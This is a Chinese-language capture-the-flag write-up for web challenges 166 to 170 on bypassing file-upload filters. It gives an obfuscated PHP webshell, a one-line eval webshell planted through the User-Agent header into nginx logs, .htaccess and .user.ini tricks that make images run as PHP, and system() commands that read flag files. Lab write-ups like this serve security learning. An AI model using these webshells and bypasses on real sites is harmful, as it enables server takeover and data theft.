<img src="\images\article_images\image-20250820113228183.png" alt="image-20250820113228183" style="zoom:25%;" />



&nbsp;



```php
/1.txt
```

<img src="\images\article_images\image-20250820113138020.png" alt="image-20250820113138020" style="zoom:25%;" />

&nbsp;



**POST并抓包**

```php
1=system("tac flag.php");
```

<img src="\images\article_images\image-20250820114058648.png" alt="image-20250820114058648" style="zoom:25%;" />

&nbsp;



**在 BurpSuite 中可查看回显flag**

<img src="\images\article_images\image-20250820114022894.png" alt="image-20250820114022894" style="zoom:25%;" />

&nbsp;



---

# web166

**查看源代码，上传文件类型为 `zip`**

<img src="\images\article_images\image-20250820142602579.png" alt="image-20250820142602579" style="zoom:25%;" />

&nbsp;



**上传 `zip` 文件，同时抓包，在BurpSuite里查看回显**

<img src="\images\article_images\image-20250820143914089.png" alt="image-20250820143914089" style="zoom:25%;" />

&nbsp;



**访问上传的页面，进行命令执行**

```php
/upload/download.php?file=d8d1765751f2bb304893c0cf64322205.zip

a=system("ls ../")
```

<img src="\images\article_images\image-20250820143750984.png" alt="image-20250820143750984" style="zoom:25%;" />

&nbsp;



```php
/upload/download.php?file=d8d1765751f2bb304893c0cf64322205.zip

a=system("tac ../flag.php")
```

<img src="\images\article_images\image-20250820143820666.png" alt="image-20250820143820666" style="zoom:25%;" />



&nbsp;



---

# web167

**`.user.ini` 可以用于多种服务器，但前提是同级目录下必须有一个php文件**

&nbsp;



**`.htaccess` 文件（只能用于 Apache 服务器）**

- **定义**：`.htaccess`（Hypertext Access）是 **Apache Web 服务器**中的一种**分布式配置文件**。
- **作用范围**：它对**所在目录**及其子目录生效。
- **优先级**：配置优先级低于 Apache 主配置文件 `httpd.conf`，但可以用来做目录级别的灵活控制。

**常见功能**

**1.网页跳转（301/302）**

- 用于把旧页面永久/临时重定向到新页面。

```ini
Redirect 301 /old-page.html http://example.com/new-page.html
Redirect 302 /temp-page.html http://example.com/temporary.html
```

**2.自定义错误页面**

- 可以指定 404、403、500 等错误的自定义页面。

```ini
ErrorDocument 404 /404.html
ErrorDocument 403 /forbidden.html
```

3.**修改文件扩展名对应的 MIME 类型**

- 比如把 `.php5` 文件当作 PHP 解析：

```ini
AddType application/x-httpd-php .php5
```

**4.访问控制（白名单/黑名单）**

- 禁止特定 IP 访问：

```ini
Deny from 192.168.1.100
```

- 只允许特定 IP 访问：

```ini
Order deny,allow
Deny from all
Allow from 192.168.1.101
```

**5.禁止目录列表**

- 如果目录中没有 `index.html`，默认 Apache 会列出目录内容。
- 可以关闭：

```ini
Options -Indexes
```

**6.设置默认首页**

- 定义访问目录时的默认文件：

```ini
DirectoryIndex index.php index.html
```

**7.URL 重写（Rewrite）**

- 需要启用 `mod_rewrite` 模块，常用于伪静态、SEO 优化：

```ini
RewriteEngine On
RewriteRule ^article/([0-9]+)$ article.php?id=$1 [L]
```

&nbsp;



```php
AddType application/x-httpd-php .jpg   //将.jpg后缀的文件解析 成php

SetHandler application/x-httpd-php    //将所有文件都解析为 php 文件
```

&nbsp;





**制作 `png` 图片，内容为 `AddType application/x-httpd-php .jpg` ，上传并抓包**

**在 BurpSuite 中修改文件名为 `.htaccess` 后 `Send`**

<img src="\images\article_images\image-20250820164020304.png" alt="image-20250820164020304" style="zoom:25%;" />

&nbsp;



**上传木马图 `png`**

<img src="\images\article_images\image-20250820164042560.png" alt="image-20250820164042560" style="zoom:25%;" />

&nbsp;



**命令执行**

```php
# GET
/upload/1.jpg

# POST
a=system("tac ../flag.php");
```

<img src="\images\article_images\image-20250820163944646.png" alt="image-20250820163944646" style="zoom: 25%;" />



&nbsp;



---

# web168

**制作内容如下的 `png` 图片**

```php
<?php
$a = "s#y#s#t#e#m";
$b = explode("#",$a);
$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];
$c($_REQUEST[1]);
?>
```

&nbsp;



**上传 `webshell.png` 后抓包，在BurpSuite中修改文件名后缀为 `php`**

<img src="\images\article_images\image-20250821011210389.png" alt="image-20250821011210389" style="zoom:25%;" />

&nbsp;



**访问 `靶机/upload/webshell/php` 进行命令执行**

```php
# GET
/upload/webshell.php

# POST
1=ls ../
```

<img src="\images\article_images\image-20250821011003318.png" alt="image-20250821011003318" style="zoom:25%;" />

&nbsp;



```php
# GET
/upload/webshell.php

# POST
1=tac ../flagaa.php
```

<img src="\images\article_images\image-20250821011049047.png" alt="image-20250821011049047" style="zoom:25%;" />

&nbsp;



---

# web169

**查看源代码，上传文件类型为 `zip`**

<img src="\images\article_images\image-20250821165440610.png" alt="image-20250821165440610" style="zoom:25%;" />

&nbsp;



**上传 `zip` 文件并抓包，在 BurpSuite 中修改 `Content-Type:` 类型为 `image/png`**  

**修改文件后缀名为 `1.php`**

**在 `User-Agent` 添加一句话木马 `<?php @eval($_POST[a]);?>`**

```php
Content-Type: image/png

# User-Agent
<?php @eval($_POST[a]);?>
```

**修改后 `Send`**

<img src="\images\article_images\image-20250821165835463.png" alt="image-20250821165835463" style="zoom:25%;" />

&nbsp;



**再上传一个文件后在BurpSuite中修改为 `.user.ini`**

```php
auto_prepend_file=/var/log/nginx/access.log
```

<img src="\images\article_images\image-20250821170042049.png" alt="image-20250821170042049" style="zoom:25%;" />

&nbsp;



**命令执行**

```php
#GET
/upload/1.php

#POST
a=system("ls ../");
```

<img src="\images\article_images\image-20250821170556956.png" alt="image-20250821170556956" style="zoom:25%;" />

&nbsp;



```php
#GET
/upload/1.php

#POST
a=system("tac ../flagaa.php");
```

<img src="\images\article_images\image-20250821170652567.png" alt="image-20250821170652567" style="zoom:25%;" />

&nbsp;



---

# web170

**查看源代码，上传文件类型为 `zip`**

<img src="\images\article_images\image-20250821165440610.png" alt="image-20250821165440610" style="zoom:25%;" />

&nbsp;



**上传 `zip` 文件并抓包，在 BurpSuite 中修改 `Content-Type:` 类型为 `image/png`**  

**修改文件后缀名为 `1.php`**

**在 `User-Agent` 添加一句话木马 `<?php @eval($_POST[a]);?>`**

```php
Content-Type: image/png

# User-Agent
<?php @eval($_POST[a]);?>
```

**修改后 `Send`**

<img src="\images\article_images\image-20250821172331063.png" alt="image-20250821172331063" style="zoom:25%;" />

&nbsp;



**再上传一个文件后在BurpSuite中修改为 `.user.ini`**

```php
auto_prepend_file=/var/log/nginx/access.log
```

<img src="\images\article_images\image-20250821172439983.png" alt="image-20250821172439983" style="zoom:25%;" />

&nbsp;



**命令执行**

```php
#GET
/upload/1.php

#POST
a=system("tac ../flagaa.php");
```

<img src="\images\article_images\image-20250821172606300.png" alt="image-20250821172606300" style="zoom:25%;" />





